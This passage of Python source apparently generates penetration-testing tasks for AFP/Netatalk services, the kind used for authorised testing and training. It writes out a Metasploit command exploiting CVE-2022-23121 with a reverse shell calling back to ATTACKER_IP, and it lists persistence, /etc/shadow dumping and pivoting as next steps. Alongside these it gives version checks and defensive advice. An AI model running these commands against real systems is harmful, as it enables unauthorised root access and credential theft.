  ls -la /mnt/afp/._* (Linux)
  ls -la@ /mnt/afp/* (macOS - shows extended attributes)

Time estimate: 2-3 minutes'''
            }
        })

        # TASK 4: Netatalk RCE (CVE-2022-23121)
        if 'netatalk' in product.lower():
            tasks['children'].append({
                'id': f'netatalk-rce-{port}',
                'name': 'Netatalk RCE Exploit (CVE-2022-23121)',
                'type': 'parent',
                'children': [
                    {
                        'id': f'netatalk-msf-{port}',
                        'name': 'Metasploit Netatalk Exploit',
                        'type': 'command',
                        'metadata': {
                            'command': f'msfconsole -q -x "use exploit/linux/netatalk/parse_entries; set RHOSTS {target}; set TARGET 0; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"',
                            'description': 'Exploit Netatalk ≤3.1.12 unauthenticated RCE (CVSS 9.8) for remote root',
                            'tags': ['OSCP:LOW', 'EXPLOIT', 'CRITICAL'],
                            'flag_explanations': {
                                'use exploit/linux/netatalk/parse_entries': 'Load Netatalk RCE module',
                                'set RHOSTS': 'Set target',
                                'set TARGET 0': 'Automatic target detection',
                                'set PAYLOAD': 'Linux x64 meterpreter reverse shell',
                                'set LHOST': 'Attacker IP for reverse connection',
                                'set LPORT': 'Attacker port for listener',
                                'exploit': 'Run exploit'
                            },
                            'success_indicators': [
                                'Meterpreter session opened',
                                'Root shell obtained (uid=0)',
                                'Exploit succeeded'
                            ],
                            'failure_indicators': [
                                'Exploit failed',
                                'Netatalk version not vulnerable',
                                'Network issues'
                            ],
                            'next_steps': [
                                'If root shell: Capture flags, enumerate system',
                                'Establish persistence (SSH keys, cron jobs)',
                                'Dump credentials (/etc/shadow)',
                                'Pivot to other systems'
                            ],
                            'alternatives': [
                                'Manual PoC (search for CVE-2022-23121 PoC on GitHub)',
                                'Custom exploit script'
                            ],
                            'notes': '''CVE-2022-23121: Netatalk RCE (2022)
- Affects: Netatalk ≤3.1.12
- CVSS: 9.8 (Critical)
- Type: Unauthenticated RCE → Remote Root
- Cause: Bounds checking bug in parse_entries()
- Vector: Malicious AppleDouble header via DSI WRITE

Vulnerable NAS vendors:
- Western Digital (PR4100)
- QNAP
- Synology
- Others shipping Netatalk ≤3.1.12

NCC Group published full write-up with PoC.

Metasploit module available (>= 6.3).

If successful: Instant root shell on NAS appliance.

Time estimate: 2-5 minutes'''
                        }
                    },
                    {
                        'id': f'netatalk-version-check-{port}',
                        'name': 'Check Netatalk Version',
                        'type': 'manual',
                        'metadata': {
                            'command': f'nmap -p {port} --script afp-serverinfo {target} | grep -i netatalk',
                            'description': 'Identify Netatalk version to determine vulnerability',
                            'tags': ['OSCP:LOW', 'RESEARCH'],
                            'notes': '''Netatalk Vulnerabilities:

CVE-2022-23121 (2022):
- Netatalk ≤3.1.12
- Unauthenticated RCE via parse_entries()
- CVSS 9.8
- PoC: NCC Group write-up

CVE-2018-1160 (2018):
- Netatalk 3.0.0 - 3.1.11
- DSI OpenSession heap overflow
- Unauthenticated code execution
- PoC: Tenable Research

CVE-2022-22995 (2022):
- Netatalk 3.1.0 - 3.1.17
- Symlink redirection → arbitrary file write/RCE
- Requires AppleDouble v2 enabled

CVE-2010-0533 (2010):
- Apple Mac OS X 10.6 AFP
- Directory traversal
- Detected by afp-path-vuln.nse

Recommendation: Upgrade Netatalk to ≥3.1.18 or 4.x

Defensive measures:
1. Disable AFP (use SMB3 or NFS)
2. Upgrade Netatalk
3. Enforce strong UAMs (DHX2), disable cleartext
4. Restrict port 548 to trusted subnets
5. Scan with: nmap --script afp-* in CI/CD'''
                        }
                    }
                ]
            })

        return tasks
